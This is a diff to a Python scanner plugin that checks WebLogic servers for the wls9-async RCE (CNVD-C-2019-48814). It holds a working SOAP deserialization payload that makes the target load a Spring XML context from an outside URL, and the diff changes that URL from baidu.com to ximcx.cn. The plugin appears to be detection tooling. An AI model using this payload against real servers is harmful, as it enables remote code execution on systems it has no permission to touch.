@@ -5,34 +5,14 @@
 
 class VulnChecker(VulnCheck):
     def __init__(self, ip_and_port_list):
-        self._name = 'rce_cnvdc201948814'
+        self._name = 'rce_cnvd201910271'
         self.info = "Check the WebLogic wls9-async RCE CNVD-C-2019-48814"
         self.keyword = ['all', 'weblogic', 'rce', 'web', 'intranet', 'cnvd-c-2019-48814', 'danger', '7001',]
         self.default_ports_list = [7001,]
         VulnCheck.__init__(self, ip_and_port_list)
 
     def _check(self, ip, port):
-        poc = '''
-        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">  
-             <soapenv:Header> 
-                 <wsa:Action>xx</wsa:Action>
-                 <wsa:RelatesTo>xx</wsa:RelatesTo>
-                     <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
-                             <java>
-                             <class>
-                             <string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string>
-                             <void>
-                             <string>http://baidu.com</string>
-                             </void>
-                             </class>
-                             </java> 
-                     </work:WorkContext>  
-                 </soapenv:Header> 
-                 <soapenv:Body>   
-                <asy:onAsyncDelivery/>  
-            </soapenv:Body>
-        </soapenv:Envelope>
-        '''
+        poc = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>http://ximcx.cn</string></void></class></java>    </work:WorkContext>   </soapenv:Header>   <soapenv:Body>      <asy:onAsyncDelivery/>   </soapenv:Body></soapenv:Envelope>'
         heads = {
                   'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
